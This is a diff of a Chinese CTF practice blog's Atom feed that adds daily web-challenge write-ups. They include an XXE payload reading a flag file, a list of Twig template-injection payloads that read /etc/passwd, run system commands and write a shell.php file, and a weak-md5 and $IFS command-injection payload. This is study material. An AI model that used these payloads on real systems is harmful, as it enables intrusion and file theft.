@@ -6,7 +6,7 @@
   <link href="http://blog.haorical.top/atom.xml" rel="self"/>
   
   <link href="http://blog.haorical.top/"/>
-  <updated>2022-02-08T09:03:34.223Z</updated>
+  <updated>2022-02-09T02:34:28.979Z</updated>
   <id>http://blog.haorical.top/</id>
   
   <author>
@@ -17,13 +17,37 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>20220209</title>
+    <link href="http://blog.haorical.top/posts/cf7d14df/"/>
+    <id>http://blog.haorical.top/posts/cf7d14df/</id>
+    <published>2022-02-09T02:01:40.000Z</published>
+    <updated>2022-02-09T02:34:28.979Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><blockquote><p>好难的题，反序列化逃逸，上一次做还是在选拔赛上</p></blockquote>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;安洵杯-2019-easy-serialize-php&quot;&gt;&lt;a href=&quot;#安洵杯-2019-easy-serialize-php&quot; class=&quot;headerlink&quot; title=&quot;[安洵杯 2019]easy_serialize_php&quot;&gt;&lt;/a&gt;[安洵杯</summary>
+      
+    
+    
+    
+    <category term="ctf每日一题" scheme="http://blog.haorical.top/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
+    
+    
+    <category term="web" scheme="http://blog.haorical.top/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
     <title>20220208</title>
     <link href="http://blog.haorical.top/posts/b87a2449/"/>
     <id>http://blog.haorical.top/posts/b87a2449/</id>
     <published>2022-02-08T06:12:18.000Z</published>
-    <updated>2022-02-08T09:03:34.223Z</updated>
+    <updated>2022-02-08T14:13:56.169Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">GVI</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="symbol">&amp;xxe;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span></span><br><span class="line">    123</span><br><span class="line">    <span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><blockquote><p>php模板注入 </p></blockquote><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p><p><strong>TWIG</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;/etc/passwd&#x27;</span>|file_excerpt(<span class="number">1</span>,<span class="number">30</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(<span class="number">1</span>).__construct(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(<span class="number">1</span>).openFile.fread(<span class="number">99</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;whoami&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#123;<span class="string">&quot;&lt;?php phpinfo();&quot;</span>:<span class="string">&quot;/var/www/html/shell.php&quot;</span>&#125;|map(<span class="string">&quot;file_put_contents&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>,<span class="number">0</span>]|sort(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|filter(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[<span class="number">0</span>,<span class="number">0</span>]|reduce(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;id&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[<span class="string">&#x27;cat /etc/passwd&#x27;</span>]|filter(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/202202081510168.png"></p>]]></content>
+    <content type="html"><![CDATA[<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">GVI</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="symbol">&amp;xxe;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span></span><br><span class="line">    123</span><br><span class="line">    <span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><blockquote><p>php模板注入 </p></blockquote><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p><p><strong>TWIG</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;/etc/passwd&#x27;</span>|file_excerpt(<span class="number">1</span>,<span class="number">30</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(<span class="number">1</span>).__construct(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(<span class="number">1</span>).openFile.fread(<span class="number">99</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;whoami&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#123;<span class="string">&quot;&lt;?php phpinfo();&quot;</span>:<span class="string">&quot;/var/www/html/shell.php&quot;</span>&#125;|map(<span class="string">&quot;file_put_contents&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>,<span class="number">0</span>]|sort(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|filter(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[<span class="number">0</span>,<span class="number">0</span>]|reduce(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;id&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[<span class="string">&#x27;cat /etc/passwd&#x27;</span>]|filter(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/202202081510168.png"></p><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>传一个表示大数的unicode字符</p><p><a href="https://www.compart.com/en/unicode/U+2187">https://www.compart.com/en/unicode/U+2187</a></p><p>我用的ↇ</p><h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>先charset改成utf-8编码</p><p>扫目录robots.txt</p><p>访问fl4g.php</p><p>payload</p><pre><code>num=1e10&amp;md5=0e215962017&amp;get_flag=tac$IFS$1fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></pre><p>5.6版本php可以绕过,7.1的不行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>md5(0e215962017)正好也是0e开头，弱比较绕过</p><p>${IFS} $IFS$1都可以绕过空格</p>]]></content>
     
     
       
@@ -483,32 +507,6 @@
     
     <category term="随笔" scheme="http://blog.haorical.top/categories/%E9%9A%8F%E7%AC%94/"/>
     
-    
-  </entry>
-  
-  <entry>
-    <title>20211018</title>
-    <link href="http://blog.haorical.top/posts/5df9dcd3/"/>
-    <id>http://blog.haorical.top/posts/5df9dcd3/</id>
-    <published>2021-10-18T13:27:21.000Z</published>
-    <updated>2021-10-30T20:14:20.104Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;BJDCTF2020-Mark-loves-cat&quot;&gt;&lt;a href=&quot;#BJDCTF2020-Mark-loves-cat&quot; class=&quot;headerlink&quot; title=&quot;[BJDCTF2020]Mark loves cat&quot;&gt;&lt;/a&gt;[BJDCTF202</summary>
-      
-    
-    
-    
-    <category term="ctf每日一题" scheme="http://blog.haorical.top/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
-    
-    
-    <category term="ctf" scheme="http://blog.haorical.top/tags/ctf/"/>
-    
-    <category term="web" scheme="http://blog.haorical.top/tags/web/"/>
     
   </entry>
   
